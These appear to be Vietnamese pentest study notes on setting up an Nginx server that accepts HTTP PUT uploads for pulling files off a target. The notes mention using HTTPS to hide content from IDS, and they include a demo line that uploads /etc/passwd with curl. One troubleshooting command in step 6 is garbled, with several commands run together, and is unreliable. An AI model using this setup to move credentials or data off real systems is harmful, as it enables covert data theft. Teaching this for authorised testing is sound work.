# Catching Files over HTTP/S

## Ý chính

HTTP/HTTPS là cách chuyển file phổ biến trong pentest vì thường được firewall cho phép. Nếu dùng HTTPS, dữ liệu được mã hóa khi truyền, tránh để IDS nhìn thấy nội dung nhạy cảm như password, config, key hoặc dump dữ liệu.

Section này hướng dẫn dựng một upload server bằng Nginx, bật HTTP method `PUT` để nhận file upload.

## Vì sao dùng Nginx?

Nginx cấu hình đơn giản và ít rủi ro hơn Apache trong trường hợp upload file nguy hiểm.

Với Apache + PHP module, nếu attacker upload file `.php`, server có thể thực thi nó thành web shell.

Với Nginx, PHP không được thực thi mặc định nếu chưa cấu hình PHP-FPM.

## Luồng cấu hình

1. Tạo thư mục chứa file upload:

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
2. Đổi owner sang user chạy web server:

```
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

3. Tạo config Nginx:

```
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

4. Enable site:

```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

5. Restart Nginx:

```
sudo systemctl restart nginx.service
```

6. Nếu lỗi port 80 bị chiếm, kiểm tra:

```
tail -2 /var/log/nginx/error.logss -lnpt | grep 80ps -ef | grep <PID>
```

7. Có thể xóa default site nếu cần:

```
sudo rm /etc/nginx/sites-enabled/default
```

8. Upload file bằng curl:

```
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

9. Kiểm tra file đã upload:

```
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

## Ghi nhớ

- `PUT` cho phép upload file lên URL cụ thể.
- `dav_methods PUT` bật upload bằng WebDAV/HTTP PUT trong Nginx.
- Không để upload directory thực thi file.
- Không bật directory listing.
- Trong pentest thật, nên dùng HTTPS khi truyền file nhạy cảm.
- Living off the Land = dùng tool có sẵn trên Windows/Linux để transfer file.